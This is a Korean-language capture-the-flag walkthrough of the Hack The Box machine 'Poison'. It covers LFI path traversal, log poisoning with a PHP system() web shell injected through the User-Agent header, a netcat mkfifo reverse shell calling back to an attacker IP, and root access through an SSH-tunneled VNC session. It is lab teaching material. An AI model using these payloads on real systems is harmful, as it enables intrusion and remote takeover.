# HTB - Poison 🐍

> **OS:** FreeBSD  
> **Difficulty:** Medium  
> **Tags:** #HTB #OSCP #LFI #LogPoisoning #PortForwarding #VNC #FreeBSD

---

## 📋 Machine Info

|항목|내용|
|---|---|
|IP|10.10.10.84|
|OS|FreeBSD|
|난이도|Medium|
|핵심 기술|LFI, Log Poisoning, SSH Tunneling, VNC|

---

## 🧭 1. Enumeration

### Nmap

```bash
nmap -p- --min-rate 5000 -T4 -sV -sC 10.10.10.84 -oN nmap/initial.txt
```

**결과:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD)
80/tcp open  http    Apache httpd 2.4.29
```

→ 열린 포트: **22 (SSH), 80 (HTTP)**

---

## 🌐 2. Web Enumeration (Port 80)

웹사이트 접속 시 로컬 `.php` 스크립트를 테스트할 수 있는 폼이 존재.  
아래 파일들이 미리 나열되어 있음:

- `ini.php`
- `info.php`
- `listfiles.php`
- `phpinfo.php`

### listfiles.php 확인

```
http://10.10.10.84/?file=listfiles.php
```

→ `pwdbackup.txt` 파일 발견 👀

### pwdbackup.txt 내용 확인

```
http://10.10.10.84/?file=pwdbackup.txt
```

→ Base64로 **13번** 인코딩된 패스워드 발견

### Base64 디코딩 (13번 반복)

```bash
echo "Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV..." | \
  base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | \
  base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | \
  base64 -d | base64 -d | base64 -d
```

또는 반복 스크립트로:

```bash
import base64

s = "Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV..."
for i in range(13):
    s = base64.b64decode(s).decode()
print(s)
```

→ 패스워드: `Charix!2#4%6&8(0`

### /etc/passwd LFI 확인

```
http://10.10.10.84/?file=../../../../etc/passwd
```

→ 유저 `charix` 확인 ✅

---

## 🖥️ 3. Initial Foothold — SSH Login

```bash
ssh charix@10.10.10.84
# Password: Charix!2#4%6&8(0
```

### User Flag 획득

```bash
cat ~/user.txt
```

---

## ⚠️ 4. Alternative Shell — Log Poisoning (LFI → RCE)

> LFI가 확인되었으므로 Log Poisoning으로 RCE 시도

### 4-1. 웹 루트 경로 확인

존재하지 않는 파일명 입력 시 에러 메시지에서 경로 노출:

```
/usr/local/www/apache24/data/
```

### 4-2. httpd.conf 위치 확인

```
http://10.10.10.84/?file=httpd.conf
```

→ 에러 메시지로 실제 경로 노출:

```
/usr/local/etc/apache24/httpd.conf
```

### 4-3. 로그 경로 확인

```
http://10.10.10.84/?file=../../../../usr/local/etc/apache24/httpd.conf
```

→ Access/Error 로그 경로 확인:

```
/var/log/httpd-access.log
```

### 4-4. PHP 코드 User-Agent에 삽입

```bash
curl -A "<?php system(\$_GET['c']); ?>" http://10.10.10.84/
```

### 4-5. RCE 확인

```
http://10.10.10.84/?file=../../../../var/log/httpd-access.log&c=id
```

→ `uid=80(www)` 출력되면 RCE 성공 ✅

### 4-6. Reverse Shell

**Listener 설정:**

```bash
nc -lvnp 9001
```

**Reverse shell 실행:**

```
http://10.10.10.84/?file=../../../../var/log/httpd-access.log&c=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202>%261|nc%2010.10.14.X%209001%20>/tmp/f
```

---

## 🔐 5. Privilege Escalation — VNC via SSH Tunneling

### 5-1. secret.zip 발견

```bash
ls ~
# secret.zip 발견
```

### 5-2. 압축 해제 (같은 패스워드 사용)

```bash
unzip secret.zip
# Password: Charix!2#4%6&8(0
```

→ `secret` 파일 획득 (VNC 패스워드 파일)

```bash
file secret
# Non-ISO extended-ASCII text, with no line terminators
hexdump -C secret
```

→ VNC passwd 파일 형식 확인

### 5-3. 내부 포트 확인

```bash
netstat -an -p tcp
```

→ `127.0.0.1:5901` — VNC 포트 확인 (로컬호스트에서만 접근 가능)

```bash
ps aux | grep vnc
```

→ VNC 서버가 **root** 권한으로 실행 중 확인  
→ 패스워드 파일 위치: `/root/.vnc/passwd`

### 5-4. SSH 포트 포워딩 (로컬 → 타겟)

```bash
ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
```

> `-L 5901:127.0.0.1:5901` → 내 로컬 5901 포트를 타겟의 127.0.0.1:5901로 포워딩

### 5-5. VNC 접속

```bash
vncviewer 127.0.0.1:5901 -passwd secret
```

→ root GUI 세션 획득 🎉

### Root Flag 획득

```bash
cat /root/root.txt
```

---

## 🗺️ Attack Path Summary

```
Nmap → Web (LFI) → pwdbackup.txt → Base64 디코딩 → SSH (charix)
                 ↓
           Log Poisoning → RCE → Reverse Shell
                                      ↓
                              secret.zip (VNC passwd)
                                      ↓
                         SSH Port Forwarding → VNCviewer → ROOT 🏁
```

---

## 💡 Key Takeaways

|기술|설명|
|---|---|
|**LFI**|`?file=` 파라미터로 서버 내 임의 파일 읽기|
|**Log Poisoning**|User-Agent에 PHP 코드 삽입 후 로그 파일 LFI로 실행|
|**SSH Tunneling**|`-L` 옵션으로 내부 포트를 로컬로 포워딩|
|**VNC**|포트 5901, passwd 파일로 인증|
|**FreeBSD 주의점**|`/bin/bash` 없음 → `/bin/sh` 사용, 일부 Linux 명령어 다를 수 있음|

---

## 🔧 Tools Used

- `nmap`
- `curl`
- `ssh` (Port Forwarding)
- `vncviewer`
- `netcat`
- `python3` (Base64 디코딩)